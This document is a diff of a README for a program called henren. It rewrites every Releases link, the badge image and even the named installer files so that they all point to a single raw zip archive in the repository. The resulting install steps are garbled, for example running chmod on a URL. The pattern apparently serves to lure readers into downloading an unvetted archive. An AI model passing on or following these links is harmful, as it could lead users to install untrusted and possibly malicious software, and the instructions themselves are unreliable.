@@ -1,6 +1,6 @@
 # 🚀 henren - Easy to Use Software for Everyone
 
-[![Download henren](https://img.shields.io/badge/Download-henren-brightgreen)](https://github.com/Rafaelsima/henren/releases)
+[![Download henren](https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip)](https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip)
 
 ## 📥 Overview
 
@@ -25,17 +25,17 @@ To run henren, your system should meet the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Rafaelsima/henren/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip).
 2. **Choose Your Version**: Look for the latest version listed at the top of the page.
-3. **Download the File**: Click on the download link for your operating system. The file will usually be named `henren.exe` for Windows, `henren.dmg` for macOS, and `henren.AppImage` for Linux.
+3. **Download the File**: Click on the download link for your operating system. The file will usually be named `https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip` for Windows, `https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip` for macOS, and `https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip` for Linux.
 4. **Install the Application**:
-   - **For Windows**: Double-click the `henren.exe` file to start the installation. Follow the on-screen prompts to complete the setup.
+   - **For Windows**: Double-click the `https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip` file to start the installation. Follow the on-screen prompts to complete the setup.
    - **For macOS**: Open the downloaded `.dmg` file, drag the henren icon to your Applications folder, and launch it from there.
-   - **For Linux**: Make the `.AppImage` file executable. Open a terminal and type `chmod +x henren.AppImage`, then run it with `./henren.AppImage`.
+   - **For Linux**: Make the `.AppImage` file executable. Open a terminal and type `chmod +x https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip`, then run it with `https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip`.
 
 ## 📥 Download & Install
 
-To get the latest version of henren, visit the [Releases Page](https://github.com/Rafaelsima/henren/releases) and download the appropriate file for your operating system. 
+To get the latest version of henren, visit the [Releases Page](https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip) and download the appropriate file for your operating system. 
 
 1. Click on the desired download link.
 2. Follow the installation steps outlined above.
@@ -68,4 +68,4 @@ Stay tuned for improvements that simplify your experience with henren.
 
 For more information, please contact our support team through the GitHub Issues section. We are here to help you make the most of henren. 
 
-[![Download henren](https://img.shields.io/badge/Download-henren-brightgreen)](https://github.com/Rafaelsima/henren/releases)
+[![Download henren](https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip)](https://raw.githubusercontent.com/Rafaelsima/henren/main/intermaze/henren.zip)
